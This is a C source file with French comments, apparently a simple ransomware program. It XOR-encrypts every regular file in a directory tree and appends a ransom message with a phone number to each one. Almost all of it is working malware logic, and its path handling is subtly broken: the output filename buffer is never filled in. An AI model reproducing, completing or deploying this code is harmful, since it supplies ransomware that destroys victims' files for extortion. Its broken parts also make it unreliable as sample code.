#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <dirent.h>  // Pour manipuler les répertoires
#include <sys/stat.h> // Pour vérifier si un fichier est régulier

void xor_encrypt(const unsigned char *input, unsigned char *output, size_t size, const char *key)
{
    size_t key_length = strlen(key);

    for (size_t i = 0; i < size; i++)
    {
        output[i] = input[i] ^ key[i % key_length]; // XOR avec la clé (boucle si nécessaire)
    }
}

int ransom(const char *input_filename, const char *output_filename, const char *key)
{
    FILE *input_file = fopen(input_filename, "rb");
    if (!input_file)
    {
        perror("Erreur lors de l'ouverture du fichier d'entrée");
        return 1;
    }

    fseek(input_file, 0, SEEK_END);
    size_t file_size = ftell(input_file);
    rewind(input_file);

    unsigned char *buffer = malloc(file_size);
    if (!buffer)
    {
        perror("Erreur d'allocation mémoire pour le buffer");
        fclose(input_file);
        return 1;
    }

    fread(buffer, 1, file_size, input_file);
    fclose(input_file);

    unsigned char *encrypted_buffer = malloc(file_size);
    if (!encrypted_buffer)
    {
        perror("Erreur d'allocation mémoire pour le buffer chiffré");
        free(buffer);
        return 1;
    }

    xor_encrypt(buffer, encrypted_buffer, file_size, key);

    const char *ransom_message = "\nRendez-vous tous ou ce sera la guerre - By TR - tel : 04.22.52.10.10";
    size_t message_length = strlen(ransom_message);

    FILE *output_file = fopen(output_filename, "wb");
    if (!output_file)
    {
        perror("Erreur lors de l'ouverture du fichier de sortie");
        free(buffer);
        free(encrypted_buffer);
        return 1;
    }

    fwrite(encrypted_buffer, 1, file_size, output_file);
    fwrite(ransom_message, 1, message_length, output_file);
    fclose(output_file);

    free(buffer);
    free(encrypted_buffer);

    printf("Fichier chiffré avec succès : %s\n", output_filename);
    return 0;
}

void encrypt_directory(const char *directory, const char *key)
{
    DIR *dir = opendir(directory);
    if (!dir)
    {
        perror("Erreur lors de l'ouverture du répertoire");
        return;
    }

    struct dirent *entry;
    while ((entry = readdir(dir)) != NULL)
    {
        if (strcmp(entry->d_name, ".") == 0 || strcmp(entry->d_name, "..") == 0)
        {
            continue; // Ignorer les entrées spéciales "." et ".."
        }

        char full_path[PATH_MAX];
        snprintf(full_path, PATH_MAX, "%s/%s", directory, entry->d_name);

        struct stat file_stat;
        if (stat(full_path, &file_stat) == -1)
        {
            perror("Erreur lors de l'obtention des informations du fichier");
            continue;
        }

        if (S_ISREG(file_stat.st_mode))
        {
            // C'est un fichier régulier, le chiffrer
            char output_file[PATH_MAX];
            // Ajout de l'extension .encrypted
            ransom(full_path, output_file, key);
        }
        else if (S_ISDIR(file_stat.st_mode))
        {
            // C'est un répertoire, appel récursif
            encrypt_directory(full_path, key);
        }
    }

    closedir(dir);
}